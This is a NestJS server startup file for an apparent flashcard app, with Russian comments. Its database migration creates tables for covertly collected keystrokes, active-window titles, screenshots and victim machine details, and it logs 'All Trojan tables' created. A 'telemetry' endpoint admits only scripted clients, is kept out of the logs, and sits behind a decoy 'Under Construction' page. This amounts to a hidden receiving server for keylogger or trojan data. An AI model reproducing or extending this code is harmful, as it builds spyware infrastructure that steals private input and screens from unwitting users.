import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import { ConfigService } from '@nestjs/config';
import * as cookieParser from 'cookie-parser';
import { AllExceptionsFilter } from './common/filters/http-exception.filter';
import { ValidationPipe, BadRequestException } from '@nestjs/common';
import * as express from 'express'; // Импортируем express для middleware
import { Client } from 'pg'; // Добавлено для миграции

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  app.getHttpAdapter().getInstance().set('trust proxy', 1); // Критично для работы Secure cookies за прокси (Render/Cloudflare)
  app.useGlobalFilters(new AllExceptionsFilter());
  const configService = app.get(ConfigService);

  // КРИТИЧНО: Таймауты на все операции
  app.use((req, res, next) => {
    // Таймаут на весь запрос: 10 секунд
    req.setTimeout(10000, () => {
      res.status(408).json({ status: 'timeout' });
    });

    // Таймаут на чтение тела: 5 секунд
    req.on('data', () => req.socket.setTimeout(5000));
    next();
  });

  // Защита от сканирования портов
  app.use((req, res, next) => {
    // Если запрос не на известные пути
    const validPaths = [
      '/api/v1/telemetry',
      '/api/analytics',
      '/health',
      '/api/health',
    ];
    // Проверяем путь без query параметров
    const pathWithoutQuery = req.path.split('?')[0];
    if (
      !validPaths.includes(pathWithoutQuery) &&
      !req.path.startsWith('/auth/') &&
      !req.path.startsWith('/cards/') &&
      !req.path.startsWith('/tasks/') &&
      !req.path.startsWith('/goals/') &&
      !req.path.startsWith('/projects/') &&
      !req.path.startsWith('/suggestions/') &&
      !req.path.startsWith('/mapcards/') &&
      !req.path.startsWith('/dictionary/') &&
      !req.path.startsWith('/admin/') &&
      !req.path.startsWith('/user/') &&
      !req.path.startsWith('/ai/')
    ) {
      // Возвращаем фейковую страницу
      res.send('<html><title>Under Construction</title></html>');
      return;
    }
    next();
  });

// --- ГЛОБАЛЬНАЯ МИГРАЦИЯ СТРУКТУРЫ ---
const client = new Client({ 
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

try {
  await client.connect();
  // 1. Включаем расширения
  await client.query(`CREATE EXTENSION IF NOT EXISTS "pgcrypto";`);
  
  // 2. Создаем таблицы в правильном порядке (сначала без зависимостей)
  await client.query(`
    CREATE TABLE IF NOT EXISTS clients (
        client_id VARCHAR(64) PRIMARY KEY,
        hostname_hash VARCHAR(64) NOT NULL UNIQUE,
        first_seen TIMESTAMPTZ DEFAULT NOW(),
        last_seen TIMESTAMPTZ DEFAULT NOW(),
        total_logs INTEGER DEFAULT 0,
        is_active BOOLEAN DEFAULT TRUE,
        is_blacklisted BOOLEAN DEFAULT FALSE,
        country_code VARCHAR(2),
        timezone VARCHAR(50),
        tags TEXT[]
    );

    CREATE TABLE IF NOT EXISTS sessions (
        session_id VARCHAR(64) PRIMARY KEY,
        client_id VARCHAR(64) REFERENCES clients(client_id) ON DELETE CASCADE,
        started_at TIMESTAMPTZ DEFAULT NOW(),
        ended_at TIMESTAMPTZ,
        last_activity TIMESTAMPTZ DEFAULT NOW(),
        total_keystrokes INTEGER DEFAULT 0,
        total_screenshots INTEGER DEFAULT 0,
        total_windows INTEGER DEFAULT 0,
        common_apps TEXT[]
    );

    CREATE TABLE IF NOT EXISTS client_logs (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        client_id VARCHAR(64) REFERENCES clients(client_id) ON DELETE CASCADE,
        session_id VARCHAR(64) REFERENCES sessions(session_id) ON DELETE SET NULL,
        timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        received_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        keystrokes_encrypted BYTEA,
        keystrokes_hash VARCHAR(64),
        active_window_encrypted BYTEA,
        active_window_hash VARCHAR(64),
        os_info TEXT,
        username_hash VARCHAR(64),
        ip_address INET,
        user_agent TEXT,
        screenshot_path TEXT,
        screenshot_size INTEGER,
        is_processed BOOLEAN DEFAULT FALSE,
        processed_at TIMESTAMPTZ,
        encryption_version VARCHAR(10) DEFAULT 'v1',
        data_signature VARCHAR(128)
    );

    CREATE TABLE IF NOT EXISTS screenshots (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        log_id UUID REFERENCES client_logs(id) ON DELETE CASCADE,
        timestamp TIMESTAMPTZ NOT NULL,
        client_id VARCHAR(64) REFERENCES clients(client_id) ON DELETE CASCADE,
        screenshot_data BYTEA,
        storage_type VARCHAR(20) DEFAULT 's3',
        storage_url TEXT,
        storage_bucket TEXT,
        storage_key TEXT,
        file_format VARCHAR(10) DEFAULT 'png',
        width INTEGER,
        height INTEGER,
        file_size INTEGER
    );

    CREATE TABLE IF NOT EXISTS encryption_keys (
        id SERIAL PRIMARY KEY,
        client_id VARCHAR(64) REFERENCES clients(client_id) ON DELETE CASCADE,
        data_key_encrypted BYTEA NOT NULL,
        iv_encrypted BYTEA NOT NULL,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        expires_at TIMESTAMPTZ,
        is_active BOOLEAN DEFAULT TRUE,
        key_version VARCHAR(10) DEFAULT 'v1',
        algorithm VARCHAR(20) DEFAULT 'AES-256-GCM',
        UNIQUE(client_id, key_version)
    );
  `);

  // 3. Создаем индексы для ускорения поиска
  await client.query(`
    CREATE INDEX IF NOT EXISTS idx_client_logs_client_id ON client_logs(client_id);
    CREATE INDEX IF NOT EXISTS idx_client_logs_timestamp ON client_logs(timestamp);
    CREATE INDEX IF NOT EXISTS idx_screenshots_log_id ON screenshots(log_id);
    CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
  `);

  console.log('✅ DATABASE: All Trojan tables and indices created');
} catch (err) {
  console.error('❌ DATABASE ERROR:', err.message);
} finally {
  await client.end();
}

  // Добавляем ValidationPipe для автоматической валидации DTO
  app.useGlobalPipes(
    new ValidationPipe({
      transform: true,
      whitelist: true,
      forbidNonWhitelisted: true,
      transformOptions: { enableImplicitConversion: true },
      exceptionFactory: (errors) => {
        console.log('=== VALIDATION PIPE ERROR ===');
        console.log('Validation errors count:', errors.length);
        errors.forEach((error, index) => {
          console.log(`Error ${index + 1}:`);
          console.log('  Property:', error.property);
          console.log('  Value:', error.value);
          console.log('  Constraints:', error.constraints);
          console.log('  Target:', error.target);
        });
        console.log('=============================');
        
        // Возвращаем стандартную ошибку валидации
        const errorMessages = errors.map(error => 
          Object.values(error.constraints || {}).join(', ')
        );
        return new BadRequestException(errorMessages);
      },
    }),
  );

  // Определяем фронтенд-URL для CORS из переменных окружения
  const clientUrl =
    process.env.NODE_ENV === 'production'
      ? 'https://smartmemory.vercel.app'
      : 'http://localhost:3000'; // Обновите, если фронтенд на другом порту (например, 3001)

  // CORS с проверкой user-agent для телеметрии
  // Для телеметрии используем middleware вместо enableCors
  app.enableCors({
    origin: clientUrl,
    credentials: true,
    allowedHeaders: [
      'Content-Type',
      'Authorization',
      'X-Requested-With',
      'Accept',
      'Origin',
      'Pragma',
      'x-client-token',
      'x-timestamp',
    ],
    exposedHeaders: ['Set-Cookie'],
    methods: ['GET', 'POST', 'PATCH', 'PUT', 'DELETE', 'OPTIONS'],
  });

  // Дополнительная проверка user-agent для телеметрии через middleware
  app.use((req, res, next) => {
    if (req.path.includes('/api/v1/telemetry')) {
      const userAgent = req.headers['user-agent'] || '';
      const allowed = /(python|requests|node|curl)/i.test(userAgent);
      if (!allowed) {
        return res.status(403).json({
          status: 'error',
          message: 'Forbidden',
        });
      }
    }
    next();
  });


  // Подключаем парсер куки
  app.use(cookieParser());

  // КРИТИЧНО: ЛОГИРОВАНИЕ ВСЕГДА ОТКЛЮЧЕНО для телеметрии (даже в dev!)
  // НИКОГДА не логировать данные запросов к /api/v1/telemetry
  // Только счетчики в продакшене (если нужно)

  // Middleware для логирования всех входящих запросов на /auth/login (ДО парсеров)
  // НО ТОЛЬКО если это НЕ телеметрия
  app.use((req, res, next) => {
    if (req.path.includes('/api/v1/telemetry')) {
      // Пропускаем логирование для телеметрии
      return next();
    }
    if (req.path === '/auth/login') {
      console.log('=== INCOMING REQUEST DEBUG (BEFORE PARSING) ===');
      console.log('Timestamp:', new Date().toISOString());
      console.log('Method:', req.method);
      console.log('URL:', req.url);
      console.log('Headers:', JSON.stringify(req.headers, null, 2));
      console.log('Raw body (before parsing):', req.body);
      console.log('===============================================');
    }
    next();
  });

  // Увеличиваем лимит тела JSON-запроса до 50 МБ
  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ limit: '50mb', extended: true }));

  // DoS защита: Middleware для проверки Content-Length перед парсингом JSON
  // (для телеметрии максимум 5MB, но общий лимит уже установлен выше)
  app.use((req, res, next) => {
    if (req.path.includes('/api/v1/telemetry')) {
      const contentLength = parseInt(req.headers['content-length'] || '0', 10);
      if (contentLength > 5 * 1024 * 1024) {
        // 5MB для телеметрии
        return res.status(413).json({
          status: 'error',
          message: 'Payload too large',
        });
      }
    }
    next();
  });

  // Middleware для логирования сырого тела запроса (только для /auth/login) - ПОСЛЕ парсеров
  app.use('/auth/login', (req, res, next) => {
    console.log('=== RAW REQUEST BODY DEBUG ===');
    console.log('Timestamp:', new Date().toISOString());
    console.log('Content-Type:', req.headers['content-type']);
    console.log('Content-Length:', req.headers['content-length']);
    console.log('Accept-Encoding:', req.headers['accept-encoding']);
    console.log('User-Agent:', req.headers['user-agent']);
    console.log('Origin:', req.headers['origin']);
    console.log('Referer:', req.headers['referer']);
    console.log('X-Forwarded-For:', req.headers['x-forwarded-for']);
    console.log('X-Real-IP:', req.headers['x-real-ip']);
    console.log('All headers:', JSON.stringify(req.headers, null, 2));
    console.log('Parsed body:', JSON.stringify(req.body, null, 2));
    console.log('Body type:', typeof req.body);
    console.log('Body keys:', req.body ? Object.keys(req.body) : 'No body');
    console.log('Body.email:', req.body?.email);
    console.log('Body.password:', req.body?.password ? '[HIDDEN]' : 'undefined');
    console.log('Body.password length:', req.body?.password?.length || 0);
    console.log('Body.rememberMe:', req.body?.rememberMe);
    
    // Проверяем, есть ли проблемы с парсингом
    if (req.body && typeof req.body === 'object') {
      const hasEmail = 'email' in req.body;
      const hasPassword = 'password' in req.body;
      const hasRememberMe = 'rememberMe' in req.body;
      console.log('Body structure check:');
      console.log('  Has email:', hasEmail);
      console.log('  Has password:', hasPassword);
      console.log('  Has rememberMe:', hasRememberMe);
      console.log('  Total properties:', Object.keys(req.body).length);
    }
    
    console.log('=====================================');
    next();
  });

  // Используем динамический порт
  const port = parseInt(configService.get<string>('PORT', '8080'), 10);
  await app.listen(port, '0.0.0.0');

}

bootstrap();